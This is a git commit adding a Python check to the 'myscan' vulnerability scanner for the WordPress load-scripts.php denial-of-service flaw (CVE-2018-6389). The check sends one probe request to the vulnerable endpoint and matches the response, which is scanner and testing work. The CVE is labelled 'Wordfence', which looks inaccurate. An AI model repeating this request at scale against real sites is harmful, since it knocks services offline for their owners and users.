269dfd377887a2d58838d4e0077d94add34166fc
liuqingsong <1352220829@qq.com>
2020-11-23 09:30:12 +0800

    添加一个wordpress 拒绝服务的验证poc

---
+++ myscan/pocs/perfolder/wordpress/poc_wordpress_dos.py
@@ -0,0 +1,45 @@
+# !/usr/bin/env python3
+# @Time    : 2020/8/21
+# @Author  : jinqi
+# @File    : poc_wordpress_dos.py
+
+'''
+未复现
+'''
+
+from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
+from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
+from myscan.config import scan_set
+import requests
+
+
+class POC():
+    def __init__(self, workdata):
+        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
+        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
+        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
+        self.name = "WordPress Wordfence cve-2018-6389"
+        self.vulmsg = "wordpress 拒绝服务漏洞 https://www.freebuf.com/vuls/222786.html"
+        self.level = 1  # 0:Low  1:Medium 2:High
+
+    def verify(self):
+        # 根据config.py 配置的深度，限定一下目录深度
+        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
+            return
+        payload_url = self.url + "wp-admin/load-scripts.php?c=1&load[]=jquery-ui-core&ver=4.9.1"
+        headers = {
+                    "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
+                    "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
+                }
+        response = requests.get(payload_url, headers=headers)
+        if response.status_code == 200 and "jQuery UI" in response.text:
+            self.result.append({
+                "name": self.name,
+                "url": self.url,
+                "level": self.level,  # 0:Low  1:Medium 2:High
+                "detail": {
+                    "vulmsg": self.vulmsg,
+                    "request": "",
+                    "response": ""
+                }
+            })
